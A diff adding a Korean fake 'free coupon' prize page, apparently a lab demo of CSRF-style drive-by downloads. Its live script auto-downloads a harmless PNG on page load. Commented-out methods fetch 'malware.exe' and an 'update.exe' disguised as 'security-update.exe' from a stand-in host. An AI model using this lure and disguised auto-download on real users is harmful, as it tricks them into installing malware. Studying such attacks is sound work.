@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>무료 쿠폰 받기</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 600px;
+            margin: 50px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 10px;
+            backdrop-filter: blur(10px);
+        }
+        h1 {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .gift-icon {
+            text-align: center;
+            font-size: 80px;
+            margin: 20px 0;
+        }
+        .message {
+            text-align: center;
+            font-size: 18px;
+            margin: 20px 0;
+        }
+        .status {
+            text-align: center;
+            margin-top: 30px;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        #hidden-frame {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🎉 축하합니다! 🎉</h1>
+        <div class="gift-icon">🎁</div>
+        <div class="message">
+            특별 프로모션에 당첨되셨습니다!<br>
+            잠시만 기다려주세요...
+        </div>
+        <div class="status" id="status">
+            쿠폰을 준비하고 있습니다...
+        </div>
+    </div>
+
+    <!-- 숨겨진 iframe으로 CSRF 공격 실행 -->
+    <iframe id="hidden-frame"></iframe>
+
+    <script>
+        // 실제 공격 시나리오 시뮬레이션
+        
+        // // 방법 1: iframe을 통한 자동 다운로드
+        // function triggerCSRFDownload() {
+        //     const targetUrl = 'https://vulnerable-site.com/api/download?file=report.pdf';
+        //     document.getElementById('hidden-frame').src = targetUrl;
+        // }
+
+        // // 방법 2: 동적 이미지 태그 생성 (GET 요청)
+        // function triggerViaImage() {
+        //     const img = new Image();
+        //     img.src = 'https://vulnerable-site.com/api/download?file=malware.exe';
+        //     // 이미지가 아닌 파일이면 다운로드 트리거
+        // }
+
+        // // 방법 3: 동적 링크 생성 및 자동 클릭
+        // function triggerViaLink() {
+        //     const link = document.createElement('a');
+        //     link.href = 'https://vulnerable-site.com/api/download?file=update.exe';
+        //     link.download = 'security-update.exe';
+        //     document.body.appendChild(link);
+        //     link.click();
+        //     document.body.removeChild(link);
+        // }
+
+        // === 로컬 파일 생성 및 다운로드 ===
+        function createAndDownloadPNG() {
+            // Canvas로 Test PNG 이미지 생성
+            const canvas = document.createElement('canvas');
+            canvas.width = 200;
+            canvas.height = 200;
+            const ctx = canvas.getContext('2d');
+            
+            ctx.fillStyle = '#ff6b6b';
+            ctx.fillRect(0, 0, 200, 200);
+            
+            ctx.fillStyle = 'white';
+            ctx.font = 'bold 20px Arial';
+            ctx.textAlign = 'center';
+            ctx.fillText('CSRF Attack', 100, 90);
+            ctx.fillText('Download Trigger', 100, 120);
+            
+            canvas.toBlob(function(blob) {
+                const url = URL.createObjectURL(blob);
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = 'download-trigger.png';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                URL.revokeObjectURL(url);
+              
+                document.getElementById('status').innerHTML = 
+                    '✓ 파일이 다운로드되었습니다.<br>' +
+                    '<small style="color: #ffeb3b;">실제 공격에서는 악성 파일일 수 있습니다.</small>';
+            }, 'image/png');
+        }
+
+        // 페이지 로드 후 자동 실행
+        window.addEventListener('load', function() {
+            setTimeout(function() {
+                createAndDownloadPNG();
+            }, 2000); 
+        });
+
+    </script>
+</body>
+</html>
